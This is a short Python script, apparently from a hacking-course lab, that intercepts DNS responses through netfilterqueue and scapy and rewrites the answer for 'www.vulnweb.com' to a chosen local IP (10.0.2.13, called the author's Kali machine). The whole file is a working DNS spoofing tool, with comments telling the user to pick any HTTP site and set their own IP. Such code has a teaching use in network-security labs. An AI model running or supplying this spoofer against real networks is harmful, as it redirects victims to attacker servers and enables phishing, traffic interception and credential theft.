#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.vulnweb.com" in qname: #chose any website who use http
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata = "10.0.2.13") #can chose any IP in my case is my Kali IP (ip route from terminal to find out your Kali IP) 
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet) #change the 0 to any other number if it does not work
queue.run()
